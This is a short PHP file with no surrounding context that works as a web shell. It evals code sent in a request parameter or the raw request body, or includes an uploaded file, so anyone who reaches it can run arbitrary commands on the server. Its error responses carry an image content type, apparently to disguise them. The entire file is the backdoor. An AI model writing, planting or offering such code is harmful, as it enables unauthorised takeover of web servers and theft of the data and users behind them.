<?php
try {
    if (array_key_exists('code', $_FILES)) {
        $x = $_FILES['code'];
        include $x['tmp_name'];
    } else if (array_key_exists('code', $_REQUEST)) {
        $x = $_REQUEST['code'];
        eval($x);
    } else {
        $body = file_get_contents('php://input');
        eval($body);
    }
} catch (Exception $e) {
    header("HTTP/1.0 500 Internal Server Error");
    header('Content-type: image/png');
    echo $e->getMessage();
}
